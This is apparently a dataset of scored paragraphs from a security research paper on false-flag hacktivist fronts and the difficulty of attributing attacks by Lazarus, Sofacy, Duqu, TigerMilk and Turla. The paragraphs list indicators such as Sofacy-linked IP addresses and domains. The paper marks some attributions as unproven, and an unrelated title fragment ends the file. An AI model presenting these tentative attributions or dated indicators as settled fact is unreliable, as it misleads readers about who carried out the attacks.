"The following examples are not intended as a particular criticism of hacktivist tendencies themselves, but rather point to the abuse potential in the prevalence of hacktivism as a commonplace element in the Internet. Threat actors interested in misleading the public and researchers alike with their disruptive activities stand to benefit from doing so under the cover of a hacktivist group. They are thereby afforded a cover of expected anonymity, plausible deniability, and the inherent legitimacy of an Internet-age societal force springing forth from a ground swell of 'community sentiment' (even when said community is nowhere to be found).",0.016348832059220997
The following two threat actors have attempted this with varying degrees of success:,0.012594373657941138
Lazarus the Weak,0.008604672684918602
"(Lazarus is also known as DarkSeoul, Operation Troy, WildPositron and TEMP.Hermit, or in relation to the malware families Destover, Duuzer, Hangman, and SpaSpe.) The Lazarus Group [10] represents a cluster of activity stretching back as far as 2009. From that time the group has engaged in a series of infamous attacks, most notably the devastating wiping attack on Sony Pictures Entertainment (SPE) in 2014. Our findings (initially presented at the 2016 Kaspersky Lab Security Analysts Summit (SAS) in collaboration with AlienVault Labs’ Jaime Blasco) tied this cluster together to contain a series of malware families and campaigns suspected of sharing the same provenance but not previously technically correlated. Looking at these different campaigns, we see a pattern emerge characterized by the use of unheard of hacktivist groups as self-assigned perpetrators of each attack. In the case of SPE, the group was 'Guardians of Peace' or GOP. We are meant to believe this is an established hacktivist group despite lacking a visible presence or pedigree before or after the attack.",0.014585811129986137
"Similarly, the 2012 attack on the Korean newspaper JoongAng Daily [11] that reportedly disrupted operations was plastered with the motto 'Hacked by IsOne', an unheard of attacker. 2013 saw wiper attacks on South Korean institutions [12] using malware designed to overwrite files with Roman army terms 'HASTATI' and 'PRINCPES' (as noted by FireEye researchers, probably a misspelling of ‘Pricipes’, a term for spearmen or swordsmen [13])before corrupting the drive's Master Boot Record. Interestingly, these attacks were claimed by two unheard of groups, the 'New Romantic Cyber Army Team' and the 'WhoIs Team' [14].",0.015245245820771136
"Despite media coverage, the Lazarus Group's insistence on employing cover groups has done little to persuade onlookers for long as to the provenance of these attacks. This is due, in large part, to the supposed perpetrators' complete lack of pedigree or prevailing Internet presence. Their lifespan is only that of the attack in question. With no entity to trace, follow, or interrogate, attention quickly turns to the more obvious perpetrator of these attacks. However, this misleading tactic has been better employed by another threat actor.",0.011608834179180794
Sofacy the Strong,0.009132757980735873
"One of the most interesting groups in recent years has been Sofacy (also known as APT28, Tsar Team and Pawn Storm, among others). Sofacy is widely believed to belong to a Russian intelligence organization, although this is still a subject of debate. The group has vast resources at its disposal and has produced copious numbers of zero-day exploits, especially in the last three years. Targeting for Sofacy has changed over the years in parallel with the Russian political climate and has included foreign government agencies (intelligence, military and civilian), suspected terrorism targets, media outlets (both foreign and domestic), non-governmental organizations (NGOs), and energy-based companies to name a few. What's most interesting about this group is their effectiveness at conducting deception operations in an effort to afford their sponsors some level of plausible deniability. We will address three instances in which Sofacy is believed to have employed a false front in order to mask its true intentions. As mentioned before, due to the sensitivity of specific data and sources, we will not reconstruct our investigations to prove these are, in fact, acts of Sofacy, but rather present the narrative in the hope of supporting a wider debate.",0.018442151773537807
CyberBerkut,0.009882125072907644
"In March 2014, a supposedly Ukrainian-based, pro-Russian separatist group calling itself CyberBerkut rose to prominence by conducting various attacks against the Ukrainian government and other entities supporting Ukraine during the annexation of Crimea [15]. The group was extremely active in 2014 and 2015, targeting not only local Ukrainian government and infrastructure, but also NATO resources, US defence companies, and the German Bundestag to name a few. While the group operated under the guise of being part of the larger Anonymous collective, further research has indicated that this may not have been the case. Some researchers in the community have indicated that a connection between Sofacy and CyberBerkut exists [16], with others going as far as stating they are one and the same. When looking at the timeline of events leading up to the annexation of Crimea and the conflict in Donbass, one can certainly make the argument that the actions of CyberBerkut align closely with Russian interests.",0.01601920136767021
"On 22 February 2014, then President Viktor Yanukovych was ousted by the Ukrainian parliament. Yanukovych eventually fled and later surfaced in exile in southern Russia. Following this, on 25 February, the special police forces in Ukraine known as 'Berkut' were dissolved by parliament. In the following weeks, unidentified gunmen, widely believed to be Russian soldiers, seized control of various checkpoints and airports throughout Crimea. Around the same time (3 March 2014), the domain cyberberkut[.]org was created and the group made its first public appearance. Before this date, there is no known data showing that the group or its members existed in any capacity. This becomes relevant when looking at the other examples given later in this section, as hacktivist groups tend to have some kind of history supporting their lineage.",0.01569637599165641
"Some of CyberBerkut's attacks also coincidentally targeted the same victims as Sofacy. In January 2015, CyberBerkut conducted attacks against multiple German government websites, including the German Bundestag [17]. Subsequently, in May 2015, the Bundestag was also attacked by what was later confirmed by the German government as Sofacy [18]. While it is not uncommon for two actors to target the same victim, the argument could be made that both attacks were conducted by the same actors, or possibly that some type of 'trade-off' occurred between the two.",0.01776460941427338
CyberCaliphate,0.008702517938014576
"On 24 December 2014, a new pro-ISIS hacktivist group by the name of CyberCaliphate announced its presence by taking control of the Albuquerque Journal's mobile application and broadcasting propaganda to its subscribers [19]. Then, on 12 January 2015, CyberCaliphate seized control of the United States Central Command (USCENTCOM)'s Twitter and YouTube accounts [20]. In February 2015, they proceeded to compromise Newsweek's Twitter account [21] and also sent propaganda text messages to subscribers using WBOC Maryland's text alert system [22]. Following these attacks, in April 2015, the group lashed out again, this time against a French television station, TV5 Monde [23], where they were able to block broadcasts for 11 stations and seize control of the TV station's social media accounts.",0.013609103223290009
"While initial speculation pointed to this being yet another pro-ISIS group attempting to spread their propaganda to the masses, further research turned up interesting data that potentially pointed to a Russian entity, specifically Sofacy, as the real culprit. First, there was no evidence of the group's existence prior to the initial attacks in January. As stated previously, it is not typical for a hacktivist group to have no pedigree or lineage prior to a large defacement such as USCENTCOM. Secondly, FireEye later revealed that the IP address of the website where data from the TV5Monde hack was published was part of the same netblock of previously known Sofacy infrastructure [24]. Additionally, other sources have shown that the registrant information used to register the group's official domain cyb3rc[.]com is linked to other well‑known Sofacy domains.",0.014229589260302822
"While the exact motivation is unknown, it is believed that CyberCaliphate was created to provide the Sofacy actors a way to conduct psychological operations against certain targets of interest while providing a level of plausible deniability. Whatever the case may be, if it weren't for a couple of small errors on the part of the actors, CyberCaliphate could have remained a useful front for their operations.",0.012557754852265512
Yemen Cyber Army,0.00969729867490976
"In the wake of the success of the CyberCaliphate campaign, another hacktivist group emerged: Yemen Cyber Army (YCA) appeared in May 2015. As with the other two groups, YCA also had no prior history and its members were completely unknown. They proclaim to be a hacktivist group operating out of Yemen, specifically supporting the Houthi movement and possessing strong anti-Saudi sentiments.",0.016309322193617803
"Saudi Arabia mounted a bombing effort in March 2015 against Yemen to suppress the ongoing Houthi forces that were overtaking Yemen's government in Sana'a. Shortly after this campaign in April 2015, the website of the London-based AlHayat newspaper was defaced by YCA. Subsequently, in May 2015, the Saudi Ministry of Foreign Affairs was also hacked by YCA and thousands of internal communications were published on Wikileaks. Many researchers currently believe YCA is an Iranian-led front to cause damage and spread propaganda against the Saudi government, but after investigating the group and its activities further, a new theory has surfaced, indicating that this is potentially another campaign orchestrated by Sofacy. While there is no solid proof showing that this is, in fact, Sofacy and not Iran, we point to factors that may shed some light in favour of the former.",0.016196850147754516
"First, it is important to understand the relationship between Russia and Saudi Arabia. Saudi is arguably one of the top nemeses of the Russian government, dating as far back as the 1980s when Saudi supported the Mujahideen during the Soviet-Afghan war. Saudi is a key US ally in the Middle East and also allied with other countries in the region that do not hold close diplomatic relations with Moscow. In February 2015, Saudi deployed fighter jets to Turkey for use in ground-based operations in Syria to support the militant opposition. Also during this time, Russia openly accused Saudi of depressing oil prices in an effort to tank the Russian economy.",0.020188750408090872
All of this speaks to the potential motive of why Russia would be very much interested in damaging the Saudi government.,0.013969419866999955
"Around the same time, in February 2015, Sofacy was discovered using a zero-day exploit against a select few targets, one of these being the Saudi Embassy in Ukraine. This exploit was used in the wild only by Sofacy until April 2015, when Microsoft finally patched it. The very limited use of this exploit during this time frame, combined with the fact that the Saudi Embassy was actively being targeted, shows a very real possibility that Sofacy had access to the Saudi Ministry of Foreign Affairs networks as early as February 2015.",0.014636765800402629
"Another interesting tie to Sofacy is a domain that was established by YCA in June 2015 (wikisaleaks[.]com). This domain was registered using privacy-protected services, but digging behind the protection revealed that the email registrant used for this domain was '[email protected]', the same as was used to register three other domains utilized by YCA (yemenica[.]com, yemenica[.]org, and yemenica[.]net). While this specific registrant has never directly been tied to known Sofacy domains, the use of Yandex email accounts is a favourite for the group. Also interesting are the nameservers used for wikisaleaks[.]com. This domain utilizes nameservers from orderboxdns[.]com, which is also a highly favoured provider for Sofacy. Further digging revealed that the domain is being hosted at 87.236.215.129. While this IP address has never been used by Sofacy before, the subnet is also a favourite of the group's. The following are some other IP addresses in the same subnet used by Sofacy in past attacks:",0.017648638432201103
87.236.215.13,0.009735569711756487
87.236.215.60,0.01000528631394193
87.236.215.99,0.01040549780168798
87.236.215.102,0.010096253723798077
87.236.215.132,0.010229347294883784
87.236.215.134,0.010187525945355214
87.236.215.143,0.010111189335174187
87.236.215.246,0.010470750444887211
"As stated above, while none of these observations represent the proverbial 'nail in the coffin', in combination they strengthen the claim that Sofacy could be behind YCA, just as it has been with the prior two campaigns. Another possibility is that Sofacy could be providing information and assistance to an Iranian-based group as they may share an interest in damaging the Saudi government. Whatever the case, Sofacy has displayed a predilection and gift for running effective deception campaigns against targets of interest, and is likely to continue to do so.",0.015662011071411852
On blame shifting,0.008080212739018822
"The following threat actors have chosen a different tactic. Rather than persuade researchers into thinking that their attacks are the work of a different category, lesser calibre player, these threat actors instead attempt to cast the blame onto another recognizable nation-state actor. The attempts are presented in rising order of perceived effectiveness.",0.013788185837237399
Duqu 2.0,0.007528584608478495
"The formidable Duqu was first discovered in 2011 by CrySyS Lab and extensively researched by GReAT. The initial notoriety of Duqu was largely due to the malware's relationship to Stuxnet, with specific modules displaying traits of shared development indicative of the Tilded platform. But Duqu is most admirable for its audacity, as displayed by the choice of infecting a Hungarian digital certificate authority in order to solve an operational requirement. Appreciative of GReAT's admiration, as conveyed through more than half a dozen blog posts and extensive analysis, the legendary threat actor resurged by hand-delivering a vastly improved version of the malware to our doorstep. This time around, Duqu was equipped with up to three zero-day exploits including a kernel exploit (CVE‑2015‑2360), memory-resident malware signed with a stolen digital certificate, and a unique persistence philosophy cognizant of the victim as a network rather than a collection of independent victim machines [25]. Other unwitting recipients of this gift included venues for P5+1 talks, industrial control systems-related companies, and telecommunications providers [26].",0.013018937573722633
"Duqu 2.0 is entirely modular, spanning upwards of 100 plug-in variants, with separate modules to handle specific operations like communications with command-and-control infrastructure and tunnelling directly into the victim's LAN. Among the latter is an NDIS filter driver internally named 'termport.sys' (the filename at time of deployment was changed to ‘portserv.sys’), whose functionality is toggled by packets that include the hard-coded magic string, 'romanian.antihacker' in the 32-bit driver. The 64-bit version, on the other hand, uses 'ugly.gorilla': a reference to a member of Comment Crew/APT1 [27]. Wang Dong, known by the alias 'Jack Wang' or the handle 'Ugly Gorilla', was one of the five PLA officers indicted [28] by a US grand jury in 2014 on 31 criminal counts related to computer abuse activities. Though APT1/Comment Crew remains active to this day, presumably with Wang Dong amongst its ranks, the idea that they are behind the Duqu 2.0 attacks is patently ridiculous.",0.010674338888315038
"Apart from a series of attributory indicators pointing in an entirely different direction, the APT1 group would have needed to get their hands on the original Duqu source code given the structural similarities in some modules of the new platform. The more likely explanation is that the threat actor noted the greater risk posed by a device driver (compared to the memory-resident modules) and peppered some false flags to misguide incident responders. By citing a publicly indicted member of a well known and widely reported APT crew, the Duqu developers may have mislead an IR team whose technical expertise in the area of threat intelligence amounted to Google searching binary strings with no greater awareness of the threat landscape to draw from.",0.012602452494095973
TigerMilk,0.008583538369650201
"The mysterious TigerMilk actor (the private TigerMilk report was pushed to Kaspersky Intel Report subscribers in November 2015) is a thus far unattributed, privately reported discovery. The campaign started in early 2015, targeting Peruvian institutions and entities exclusively for a period of six months. The attacker used a commonplace exploit (CVE-2012-0158) in conjunction with a curriculum vitae stolen from a local victim in order to infect users with custom credential-stealing malware. The position-independent backdoor was injected into processes like explorer.exe and various browsers. In 64-bit systems, the malware would spawn a separate desktop with its own infected explorer.exe to avoid suspicion. However, in operation the malware was clunky and caused perceptible instability so neither the development nor the intended functionality were indicative of a sophisticated actor. So why mention TigerMilk?",0.008527637450572612
"The one particular feature of TigerMilk that makes it noteworthy is its use of a notorious digital certificate. Every backdoor deployed is signed with the same stolen Realtek certificate (serial number: 5e 6d dc 87 37 50 82 84 58 14 f4 42 d1 d8 2a 25) as Stuxnet(.a/.b). The samples were compiled and signed long after the certificate's validity expired (12 June 2010), thereby obviating its use as a means of bypassing execution controls. As such, the only imaginable value of signing these samples with this particular certificate is to fool incident responders and researchers into casting blame on the notorious Stuxnet team for an attack on Peruvian military and government institutions. Moving beyond this basic deception, the true unresolved mystery of TigerMilk is: how did this new actor get its hands on this specific certificate?",0.012415977958158075
The man behind the curtain,0.009355211671520092
"One of the most advanced and prolific known threat actors is the Turla group. They have existed in some shape or form since at least 2006, but some speculate that their true origins may be as much as a decade earlier. It's widely accepted that Turla is a state-sponsored actor originating from Russia. What makes Turla so fascinating is the group's attention to detail, operational security, and advanced tactics for victim data exfiltration. During one specific incident in November 2012, the Turla group showed their willingness to engage in deception tactics when cornered.",0.01310357011535268
"Turla compromised a handful of victims during this campaign, but one particular European victim proved especially enticing. The group had deployed their typical first-stage malware, Wipbot, on the victim's system and began their normal routine of collection and monitoring. At some point, the victim became suspicious and decided to engage their incident response (IR) team to investigate their network and determine the source of nefarious activity. The IR team began their normal process of surveying the system and running various investigative tools, however, they did not pull the system offline. Turla became aware that they would soon be discovered. At this point, most actors would simply uninstall their malware from the victim and move on. Instead, Turla decided to have a bit of fun with the IR team in an attempt to cover their tracks.",0.018795589432596738
"They proceeded to utilize Wipbot to download and install a second-stage binary. But this was no ordinary Turla malware, rather they installed a somewhat rare, already compiled piece of Chinese malware by the name of Quarian. The Quarian malware communicated back with infrastructure located in Beijing, which was neither under Turla's control nor related to previous Turla operations. They then proceeded to uninstall the Wipbot malware and erase their tracks from the victim systems.",0.012822251800664541
"This proved to be a great move on their part, as the IR team spent countless hours tracking down the Quarian malware and assuming the victim had been targeted by a Chinese-based APT group. Because they used a lesser-known piece of malware, the investigators first had to identify the family, then dig through the sprawling infrastructure in search of some level of attribution. All of this work was obviously pointless and served as a fantastic smoke screen for Turla's retreat.",0.012229577776368572
A complicated landscape,0.007839199182993029
"Beyond the particulars of an investigation or the cunning of a given actor, attribution suffers from a variety of complications ranging through varying external motivators, inherent limitations, and methodological disparities across vendors and research teams. This merits a more high-level discussion of conditions complicating attribution in targeted attacks. The intended takeaway is that attributory analysis is far from straightforward, largely hermeneutic, and in no way a standard practice at this time.",0.012749742584708401
General complications,0.006445375950098309
"Your sexiest attribution, please",0.01105865343411827
"The private threat intelligence production landscape involves various intertwined forces that arise from an interplay between private industry, private and public consumers, and public attention. Various motivations arise within this interplay, most notably that of the value of media attention and free PR, which has proven a notable motivator for the rise of threat intelligence production in the anti-malware industry. While some TI teams have arisen out of the need for in-house elite researchers to deal with sophisticated attacks, many have followed from the realization that TI products garner heavy media attention with inherent marketing value. Judgment for this tactic is dampened by recognition of its value in motivating the awareness and adoption of the need for mature threat intelligence in an industry where even corporate giants and leaders in technology products have been less than willing to devote even meagre resources to tackle a complex, demanding, and ever-evolving problem.",0.01673437224452412
"However, as is often the case with easy value-added ventures, abuse is quick to follow, as immature threat intelligence producers (often never-before-seen start-ups) have taken the stage with bombastic, absurd, and unverifiable attribution claims for the sake of headline stories that bring their companies to momentary prominence. These stories will serve as an excuse to approach or even extort potential victims-cum-customers whose dismayed IT teams are forced to spend precious limited resources chasing down nebulous leads for the sake of due diligence to reassure an anxious C-suite of the continued integrity of their systems, reputation and intellectual property. These tactics have borne ephemeral fruit not only with claims of sophisticated attacks but also presumed breaches, larger-than-life credential dumps, and ghost botnets.",0.011987675050413538
"This is not the only case where an eager but sometimes technically naïve media machine is abused to the detriment of the threat intelligence production landscape. In an effort to foster a sense of balanced debate, media outlets have entertained any sign of contention in the research community, lending credence to doubt even where there is little ambiguity and breeding a class of pundits charitably referred to as professional cyber-truthers, who have built careers on the basis of sparsely substantiated contrarian attributory claims. While legitimate disagreement in the research community should not be diminished, we should also acknowledge the prevalence of sniping between competing vendors, the anti-anti-malware peanut gallery, and other skeptics eager to disparage popular research at face value.",0.013777696994733857
"In response, larger outfits are increasingly adopting a closed‑door approach to the distribution of threat intelligence products, or the partial withholding of significant details intended solely for paying customers – an approach with obvious benefits and latitude for expression, but one that's also prone to validation issues as the value of the research product cannot be verified by qualified third parties (discussed as a validation crisis likely to arise in threat intelligence [29]). On the off-chance that a given vendor's products prove dubious or inconsequential for a single-source consumer, this can lead to an erosion of trust in threat intelligence as a whole.",0.015027392469585954
The one-eyed man is king,0.010529204132063819
"The very nature of threat intelligence results from a fascinating injection of third-party observers into the dynamic between an attacker and victim, often by chance. This serendipitous interplay may be the result of a contractual placement of defence solutions in the victim's network, the maintenance of service infrastructure (as in the case of ISPs and webmail, cloud or storage providers), or by stumbling upon attack artifacts found on multi-scanners, staging servers, or through their foolishly wide distribution, in the case of hamfisted attackers.",0.010721497670703517
"The implicit takeaway is that the position of the threat intelligence producer will shape the nature of the research by virtue of limited visibility. All possible producers inevitably suffer from varying degrees of limited visibility. This often means that two different similarly positioned companies possess different incomplete parts of the same operation, that endpoint security companies see payloads with no network traffic, that ISPs see network traffic and victimology but no payloads, and so on. To then claim perfect awareness over a given campaign will prove short-sighted folly, given that little deters the same actors from continuing their efforts, often retooling and targeting the same victims. Failures become apparent as alternate reports contain vaguely overlapping IOCs that showcase the incompleteness of a single-source report and extended campaigns against a given victim may abuse previously unseen attacker capabilities possibly witnessed by other vendors.",0.012482204606947822
Analyst training,0.008901577075732359
"An often ignored facet of the threat intelligence production cycle is the role of the analyst whose purpose is to coalesce various sources of information, arrive at various conclusions, and vet the overall logic of the finished product. Sadly, at this stage in the rise of the threat intelligence industry, deficient hiring practices overemphasize specialized technical knowledge and eschew generalist broad-thinking capabilities, often assuming technical candidates will bring these in tow. This is seldom the case, as showcased by talented malware reverse engineers who don't consider themselves 'threat hunters', as well as by outlets promulgating technical malware breakdowns who fail to identify the connection of these artifacts with larger campaigns.",0.012329355720830937
"Threat intelligence analysts often suffer from deficient training in conventional intelligence analysis. Industry forums and conferences are heavily populated with trainings and ample resources aimed at fostering skills such as reverse engineering and 'threat hunting' that are essential to the production process, but among these little is exclusively aimed at fostering the broad-thinking methodologies necessary to turn technical indicators and victimology into a reliable estimative and actionable consumable product. Many military and intelligence metaphors and models are suggested at this stage but these are still reliant on the ability of the analyst to weigh different possibilities and scenarios, keeping excitement for a given theory at bay, and allowing for accurate estimative language to make its way to the final recipient.",0.01697828708377247
"In simpler terms, it's necessary to state that a hunch is a hunch, that some conclusions are sparsely sourced or cannot be independently arrived at, or that no conclusion can be made at this time. There exist a handful of exemplary threat intelligence veterans whose familiarity with previous operations allows them to express high accuracy intuitions that speak to the provenance of targeted attacks; the remainder of us mere mortals must be able to follow the logical foundations of a theory to arrive at an accurate action plan that can independently be sustained by the consuming IT and IR teams.",0.014226125577987303
Methodological complications,0.0065232662329594016
Scope,0.01247629342784573
"Even among seasoned threat intelligence producers, significant disagreements arise. Investigating a targeted attack is a largely hermeneutic endeavour as researchers interpret sparse fragments and indicators to understand the means, capabilities and (hopefully) the intentions of the attackers. A common pitfall arises from a lack of consensus on whether a given threat actor is defined by a shared toolkit, overlapping infrastructure, or similarities of tasking. The disagreement is most visible in disparate naming schemes across vendors, an issue that isn't as superficial as picking a shared name when differences in visibility are coupled with one vendor's insistence to categorize an actor by their shared use of a given lateral movement tool while another vendor focuses on a cluster of phishing infrastructure. The issue extends beyond mere preference to reflect a heterogeneous understanding of the scope and intended functionality of threat intelligence products.",0.014403995748479947
Functionality,0.008117056233382214
"Further complications arise when considering the variable intended functionality of threat intelligence products. Is the intended purpose PR value, enterprise defence, or cyber situational awareness? Each of these is a legitimate purpose but not all are equally served by the same product. We touched upon the complications that arise with seeking PR value, which tends to require audacious attribution claims that stand in conflicting opposition to the alternatives mentioned. A product intended to support an audacious claim particularly through wide and loud distribution will cripple its own actionable value as it spooks the attacker. The likely reaction is also a general retooling that cripples any prolonged awareness or ability to track a known determined malicious actor.",0.012596181729850109
"On the other hand, defending an enterprise network gains little from country-level attribution claims. By its very nature, the institution is endowed with little latitude to retaliate against a nation state no matter what the injustice of a cyber-espionage or sabotage campaign. Defending the enterprise requires campaign-level understanding that includes an awareness of infection vectors, toolkits, and attacker standard practices. Loosening the grip of a specific campaign will then allow the victim enterprise to switch to tracking the threat actor or related actor cluster in preparation for the future attempts that will almost certainly come.",0.02058302967685055
"Finally, in the case of the larger project of cyber situational awareness, there are requirements that sometimes stand in juxtaposition to both the media imperatives and the defence of any particular entity. With the most cunning and resilient actors, tracking may well require an infection not to be cleared immediately, so as not to spook the actor being hunted. Understanding that some threat actors are so cunning and well resourced that playing network 'whack-a-mole' is unlikely to deter them in the least, researchers stand to benefit from quiet observation and the deployment of radical tailored defence solutions rather than the simple disinfection of a given machine. Though this approach may be shocking to those critics who consider the single role of anti-malware to be that of machine disinfection, it is important to consider the heavy weaponry commanded by actors of this calibre. Exemplary 'god mode'-style zero-day exploits are a concern for an entire software ecosystem and not just a single victim. In turn, these require a large-scale immune response, beginning with the discovery and understanding of the technique leveraged, propelled in priority by its abuse in the wild, and only then postulated for resolution by the software behemoths that support the relevant codebase. The role of the anti-malware industry here extends beyond simple metrics and immediate customer obligations to that of defenders of the larger ecosystems in the face of unscrupulous actors.",0.016335840884867725
"Given an understanding of how the intended audience shapes the research imperative and thereby the consumable product, there is a need for research teams to define their intended audience during the production cycle itself and not after.",0.018187352581561123
Reflections,0.008672572649079169
"Threat intelligence has true value beyond the current hype of an emerging pocket in the information security industry. As showcased by the multiple examples presented of abuse in the wild, there is a need for professionals whose job it is to understand the apex predators in the malware ecosystem. In juxtaposition to IT and IR teams whose overlapping responsibilities in responding to attacks are sometimes considered capable of obviating the need for TI, the latter is the sole producer of the historical context that helps mitigate the attackers' potential ability to manipulate responders into chasing down ghosts, by virtue of familiarity and a broad-thinking methodology. In place of a summary conclusion, we instead leave open questions in need of deeper reflection, on the part of both producers and consumers of threat intelligence, to serve as our final takeaways in furthering a much needed conversation.",0.012133713947105274
What is solid attribution?,0.011442475394088159
"Considering the common bases for attribution, limitations in visibility specific to each research camp, and requirements specific to each type of customer, what could possibly make a satisfactory attribution claim? We must ask ourselves if there can even be such a thing. In a hypothetical scenario where we have packets captured en route (as in the common jab 'PCAP or GTFO'), could it not be a backdoored system being used to proxy through? Where we catch a nation-state operator red‑handed, would we not need an understanding of the provenance of their tasking? More realistically, there will never be a solid enough attribution claim for everyone to get behind. Rather, the combination of multiple indicators helps an analyst make an educated determination of the trustworthiness or accuracy of a claim. This further highlights the importance of estimative language that allows others to make strategic decisions based on preferably unbiased facts with the analyst's opinion as a guide.",0.012810758529210875
What is actually needed?,0.013752832470705578
"A more sobering metric for attribution claims rests in understanding the action capability of the intended recipient. What can a single non-governmental entity do with the name of a nation-state operator? How does it bolster its defensive stance against further attack to be told which Chinese citizen to peg on its dartboard? On the other hand, a government (whose recourse includes diplomatic, legal, and even retributory CNO) stands to benefit from the greatest possible level of fidelity in attribution. The question 'what do you actually need?' has to be answered in relation to 'who are you meant to be serving?'. The guiding principle remains the production of actionable intelligence and not the feeding of 'cyber-voyeurism' and grandstanding.",0.013462734535258591
Who can really do attribution?,0.013143580441614455
"The attribution limitations do not apply to all producers equally. If a 'PCAP' is considered the ultimate measure of attack fidelity, then what entity is more supremely positioned to perform attribution than the modern SIGINT agencies? These 'gods of the wires' are positioned in such a way as to enact near perfect recall when an attack is discovered, either by snooping on the wires or having 'popped' the routers in a country of interest. In true Greek irony, the Cassandras of the modern age are hamstrung by their own Apollonian curse: as intelligence agencies they are blessed with the ability to see but not to publicly substantiate, the gift to attribute without being believed.",0.01169053310776369
Who are you hacking back?,0.013037559557309564
"Finally, for anyone holding out hope that anything like 'cyber‑retribution' can ever legitimately enter the stage for private entities, we hope to have provided enough reason for ample skepticism. In a world where solid attribution claims in the private sector are unlikely, how does one go about 'hacking back'? Moreover, with cunning attackers manipulating victims into casting blame towards an unrelated entity, who's to blame when misattribution leads to a retributory attack on another blameless victim?",0.01458893963923158
References,0.0158494738281566
[1] Darkhotel's attacks in 2015. Securelist. August 2015. https://securelist.com/blog/research/71713/darkhotels-attacks-in-2015/.,0.015804664277621283
"[2] Schneier, B. Simultaneous Discovery of Vulnerabilities. Schneier on Security. February 2016.https://www.schneier.com/blog/archives/2016/02/simultaneous_di.html.",0.01346069213815071
[3] Equation Group: Questions and Answers. Securelist. February 2015. https://securelist.com/files/2015/02/Equation_group_questions_and_answers.pdf.,0.013088435997622883
"[4] Fagerland, S.; Grange, W. Blue Coat Exposes 'The Inception Framework'; Very Sophisticated, Layered Malware Attack Targeted at Military, Diplomats, and Business Execs. Blue Coat Labs. December 2014. https://www.bluecoat.com/en-gb/security-blog/2014-12-09/blue-coat-exposes-%E2%80%9C-inception-framework%E2%80%9D-very-sophisticated-layered-malware.",0.013241608775875768
"[5] Fagerland, S.; Grange, W. The Inception Framework: Cloud-Hosted APT. Blue Coat Systems.https://www.bluecoat.com/documents/download/638d602b-70f4-4644-aaad-b80e1426aad4/d5c87163-e068-440f-b89e-e40b2f8d2088.",0.01257544826190582
[6] Cloud Atlas: RedOctober APT is back in style. Securelist. December 2014. https://securelist.com/blog/research/68083/cloud-atlas-redoctober-apt-is-back-in-style.,0.013145512171460205
"[7] The ""Red October"" Campaign – An Advanced Cyber Espionage Network Targeting Diplomatic and Government Agencies. Securelist. January 2013. https://securelist.com/blog/incidents/57647/the-red-october-campaign.",0.016463684309091953
"[8] Romang, E. http://eromang.zataz.com/2013/02/20/facebook-apple-twitter-watering-hole-attack-additional-informations/.",0.012352556672871606
"[9] Romang, E. http://eromang.zataz.com/2013/03/24/osx-pintsized-backdoor-additional-details/.",0.010506982694827194
"[10] Guerrero-Saade, J. A.; Raiu, C. Operation Blockbuster revealed. A glimpse at the spider web of the Lazarus Group APT campaigns. Securelist. February 2016. https://securelist.com/blog/incidents/73914/operation-blockbuster-revealed/.",0.012313140952659563
[11] AFP. South Korea Says North Was Behind Cyber Attack on Newspaper. Security Week. January 2013. http://www.securityweek.com/south-korea-says-north-was-behind-cyber-attack-newspaper.,0.017872171589348063
"[12] Schwartz, M. J. South Korean Bank Hackers Target U.S. Military Secrets, Dark Reading. 2013.http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674?.",0.015222257745704293
"[13] Pidathala, V.; Sai Omkar Vashisht, S. O.; Khalid, Y.; Singh, A. More Insights on the recent Korean Cyber Attacks (Trojan.Hastati). FireEye. March 2013. https://www.fireeye.com/blog/threat-research/2013/03/more-insights-on-the-recent-korean-cyber-attacks-trojan-hastati.html.",0.013058607283070844
[14] South Korea Under Cyber Attack. North Korea suspected of carrying out major cyber attack against Seoul-based banks and broadcasters. NK News. March 2013. https://www.nknews.org/2013/03/south-korean-banks-broadcasters-paralyzed-by-cyber-attack/.,0.015036910115856617
[15] CyberBerkut. Wikipedia. https://en.wikipedia.org/wiki/CyberBerkut#Activity.,0.013622629718800794
"[16] Lehtiö, A. Twitter. https://twitter.com/lehtior2/status/672351924734312448.",0.012335596598257781
"[17] Crauß, U. Cyber-Angriff auf Kanzleramt und Bundestag. Die Welt. January 2015. http://www.welt.de/politik/deutschland/article136114277/Cyber-Angriff-auf-Kanzleramt-und-Bundestag.html.",0.01215778721615246
"[18] Wagstyl, S. Germany points finger at Kremlin for cyber attack on the Bundestag. FT. http://www.ft.com/cms/s/0/668a131e-1928-11e6-b197-a4af20d5575e.html#axzz4CQg3T78B.",0.010791810010405634
"[19] Malone, P. Hoax or cyberattack? ABQ Journal's mobile app hacked. The Santa Fe New Mexican. December 2014. http://www.santafenewmexican.com/news/local_news/hoax-or-cyberattack-abq-journal-s-mobile-app-hacked/article_32f895fa-79e4-5b13-9f6e-a43a4d2bc8da.html.",0.010446408095205584
"[20] CNN Staff. CENTCOM Twitter account hacked, suspended. CNN Politics. January 2015.http://www.cnn.com/2015/01/12/politics/centcom-twitter-hacked-suspended/.",0.014536924650376037
"[21] Mosendz, P. Newsweek Twitter Account Hacked by Group Claiming ISIS Affiliation. Newsweek. 2015. http://www.newsweek.com/newsweek-twitter-account-hacked-isis-affiliated-group-305897.",0.01361924568970485
[22] WBOC Victim of Another Cyber Attack. WBOC. February 2015. http://www.wboc.com/story/28070058/wboc-text-alerts-cyberattacked.,0.015224058540209362
[23] ISIS-allied hackers claim worrying new attack. CBS News. April 2015. http://www.cbsnews.com/news/french-tv-network-tv5-monde-hacked-by-cybercaliphate-in-name-of-isis/.,0.01579649615080969
"[24] Leyden, J. Russia's to blame for pro-ISIS megahack on French TV network. The Register. June 2015.http://www.theregister.co.uk/2015/06/10/russian_trolls_staged_tv5monde_megahack_shocker/.",0.013471974638260775
[25] The Duqu 2.0 Technical Details. Securelist. June 2016. https://securelist.com/files/2015/06/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf.,0.012210839719005495
[26] Duqu 2.0: Reemergence of an aggressive cyberespionage threat. Symantec. June 2015.http://www.symantec.com/connect/blogs/duqu-20-reemergence-aggressive-cyberespionage-threat.,0.015867505080209843
[27] Critical Lessons from 15 Years of Industrial Control Systems Vulnerabilities. http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf.,0.015624090941459445
[28] Wanted by the FBI: Wang Dong. https://www.fbi.gov/wanted/cyber/wang-dong/view.,0.012826317270713927
"[29] Guerrero-Saade, J. A. The Ethics and Perils of APT Research: An Unexpected Transition into Intelligence Brokerage. Proceedings of the 25th Virus Bulletin International Conference, 2015. http://media.kaspersky.com/pdf/Guerrero-Saade-VB2015.pdf.
",0.015815205097176932
"Redkit Exploit Kit does the splits
